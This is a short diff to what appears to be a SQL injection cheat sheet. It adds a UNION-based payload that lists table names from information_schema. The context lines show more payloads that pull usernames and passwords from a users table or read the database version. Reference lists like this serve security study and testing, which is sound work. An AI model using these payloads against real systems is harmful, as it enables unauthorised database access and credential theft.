@@ -25,6 +25,7 @@ SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"
 '+UNION+SELECT+username,+password+FROM+users--
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 '+UNION+SELECT+@@version,+NULL#
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 
 Database type 	Query
 Microsoft, MySQL 	SELECT @@version
